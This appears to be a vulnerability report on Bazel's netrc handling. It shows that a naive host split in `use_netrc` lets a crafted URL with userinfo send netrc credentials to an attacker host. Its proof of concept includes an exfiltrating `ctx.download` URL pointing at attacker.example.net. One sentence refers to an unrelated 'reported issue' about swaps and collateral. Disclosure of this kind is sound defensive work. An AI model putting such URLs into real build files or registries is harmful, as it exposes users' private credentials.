### Title
Netrc Credential Leak via URL Userinfo Parsing Mismatch Between `use_netrc` and Actual HTTP Request Host - (File: `tools/build_defs/repo/utils.bzl`)

### Summary
`use_netrc()` decides, per URL string, whether to attach netrc login/password (or a custom `auth_pattern` derived `Authorization` header) to a request by extracting the "host" with a naive string split. The actual outbound HTTP connection is made from the very same URL string by Bazel's HTTP client, which parses the URL according to RFC 3986 URI semantics (host = the substring after `@` in the authority, not before it). Because these two parsers disagree on what the "host" portion of an authority segment containing `@` is, a URL can be crafted so `use_netrc` attaches credentials meant for a trusted host while the actual TCP/TLS connection — and thus the credentials — go to an attacker-controlled host.

### Finding Description
`use_netrc` in [1](#0-0)  computes the host for matching netrc entries as:
```
schemerest = url.split("://", 1)
...
host = schemerest[1].split("/")[0].split(":")[0]
```
This takes everything before the first `/` after the scheme, then everything before the first `:`. For a URL such as `https://victim.example.com:junk@attacker.example.net/payload`, this naive parser computes `host = "victim.example.com"` (text before the first colon), because it has no concept of the `user:password@host` authority-component grammar.

Bazel's real HTTP client, however, parses the URL as an RFC 3986 URI, where an `@` in the authority separates userinfo from host: it would treat `victim.example.com:junk` as userinfo and `attacker.example.net` as the actual host it connects to.

The consequence: if the requester's `.netrc` has credentials for `victim.example.com`, and the URL list handed to `download`/`download_and_extract`/`http_archive` etc. contains a URL of the crafted form above, `use_netrc` (invoked from `get_auth()` in the same file, used throughout `http.bzl`/`git.bzl` machinery) will attach the `victim.example.com` credentials as an `Authorization` header (or basic auth) to a request that is actually sent to `attacker.example.net`. This is structurally the same class of bug as the reported issue: two different consumers decode the same encoded structure (a byte/token sequence there, a URL string here) differently, and the mismatch is exploited to make a security-relevant decision (collateral check / credential attachment) based on the wrong component, while the real action (swap / HTTP request) uses the other parse.

### Impact Explanation
The URL list passed into `download`/`http_archive`/`http_file` (and `mirror_urls` in the Bazel registry `source.json`) can come from module extensions, registries, or generated URL lists — content that can be influenced by an unprivileged party contributing a module/URL to a registry the build consumes, or by an attacker who can get one URL among several mirrors accepted (e.g., BCR-style community-contributed metadata, or any repository rule building URLs from less-trusted input). If a victim's `.netrc` contains credentials scoped to a legitimate host name that appears (in an authority-with-userinfo position) inside such an attacker-supplied URL, those credentials are exfiltrated to the attacker's server over the actual connection. This is a credential-exfiltration-to-attacker-controlled-host bug matching the "credentials are host-scoped" invariant this bug class is meant to protect.

### Likelihood Explanation
Exploitation requires: (1) a URL string reaching `use_netrc`/`get_auth` that is not fully under the direct control of the trusted root-repo BUILD/.bzl files (e.g., sourced from a registry entry, generated mirror list, or other external, less-trusted metadata), and (2) a `.netrc` entry for the host name embedded before the `@`. Given Bazel's netrc/auth flow is a common path for authenticated fetches (private registries, mirrors), and URL strings from `source.json`/mirrors are exactly the kind of "dependency-declared, not directly reviewed" strings this bug class targets, the likelihood is non-trivial wherever netrc-based auth is combined with externally influenced URLs.

### Recommendation
Make `use_netrc`'s host extraction RFC 3986-compliant (parse userinfo/host/port using the same logic — or an equivalent robust URI parser — that the actual HTTP client uses to determine the connection target), so the authorization decision and the actual request destination are always derived identically. Reject or strip unexpected userinfo components from URLs before computing the netrc match, and add regression coverage for `user:info@host` style URLs.

### Proof of Concept
1. Configure a `~/.netrc` (or repository rule `netrc` attribute) with:
```
machine victim.example.com
login someuser
password SECRET
```
2. Have a repository rule (or registry-provided `source.json`/mirror URL) issue:
```python
ctx.download(
    url = "https://victim.example.com:ignored@attacker.example.net/payload",
    ...
)
```
using `use_netrc`/`get_auth` from `tools/build_defs/repo/utils.bzl` to build the `auth` dict.
3. Observe (e.g., via a `src/test/shell/bazel/starlark_repository_test.sh`-style test with a local HTTP server standing in for `attacker.example.net`) that the `Authorization`/basic-auth header built for `victim.example.com` is sent in the request that is actually delivered to `attacker.example.net`, confirming credential exfiltration to the attacker-controlled host — extend the existing netrc test scaffolding at [2](#0-1)  with such a crafted URL and an assertion that the credentials are sent to the wrong host.

```text
def use_netrc(netrc, urls, patterns):
    """Compute an auth dict from a parsed netrc file and a list of URLs.

    Args:
      netrc: a netrc file already parsed to a dict, e.g., as obtained from
        read_netrc
      urls: a list of URLs.
      patterns: optional dict of url to authorization patterns

    Returns:
      dict suitable as auth argument for ctx.download; more precisely, the dict
      will map all URLs where the netrc file provides login and password to a
      dict containing the corresponding login, password and optional authorization pattern,
      as well as the mapping of "type" to "basic" or "pattern".
    """
    auth = {}
    for url in urls:
        schemerest = url.split("://", 1)
        if len(schemerest) < 2:
            continue
        if not (schemerest[0] in ["http", "https"]):
            # For other protocols, bazel currently does not support
            # authentication. So ignore them.
            continue
        host = schemerest[1].split("/")[0].split(":")[0]
        if host in netrc:
            authforhost = netrc[host]
        elif "" in netrc:
            authforhost = netrc[""]
        else:
            continue
```
